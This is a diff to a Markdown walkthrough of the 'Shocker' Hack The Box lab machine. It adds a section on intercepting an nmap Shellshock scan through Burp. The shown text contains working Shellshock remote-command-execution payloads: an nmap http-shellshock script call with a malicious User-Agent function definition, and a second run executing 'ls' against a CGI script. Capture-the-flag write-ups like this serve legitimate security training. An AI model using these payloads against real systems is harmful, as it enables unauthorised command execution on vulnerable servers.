@@ -7,8 +7,9 @@ Level: Easy
 3. [Web enumeration](#Web%20enumeration)
 	1. [`Almost Got The Shell...`](#`Almost%20Got%20The%20Shell...`)
 	2. [`Validating Shell Shock using nmap`](#`Validating%20Shell%20Shock%20using%20nmap`)
-	3. [`ShellShock using CURL`](#`ShellShock%20using%20CURL`)
-	4. [`User Flag using ShellShock`](#`User%20Flag%20using%20ShellShock`)
+	3. [`Intercepting Nmap Scan using Burp`](#`Intercepting%20Nmap%20Scan%20using%20Burp`)
+	4. [`ShellShock using CURL`](#`ShellShock%20using%20CURL`)
+	5. [`User Flag using ShellShock`](#`User%20Flag%20using%20ShellShock`)
 4. [Privilege Escalation](#Privilege%20Escalation)
 	1. [`Grab the Perl Shell`](#`Grab%20the%20Perl%20Shell`)
 	2. [`Got Root Flag`](#`Got%20Root%20Flag`)
@@ -83,6 +84,17 @@ You can perform the RCE using HTTP User Agent Request header and nmap using the 
 ```
 # nmap -p80 --min-rate=1000 --script "http-shellshock" --script-args "uri=/cgi-bin/user.sh,cmd='echo User-Agent: () { :; }; echo; /bin/whoami'" shocker.htb
 ```
+
+###### `Intercepting Nmap Scan using Burp`
+Set your Burp as following Config
+![](shocker_nmap_burp.png)
+Than make sure you can access port 80 of the target using `http://127.0.0.1:8081/` and than run the following command
+```
+# nmap -p8081 --min-rate=1000 -sV --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 127.0.0.1
+```
+
+Looking at Burp Browsing History, You will notice,
+![](shocker_nmap_burp1.png)
 
 ###### `ShellShock using CURL`
 ```
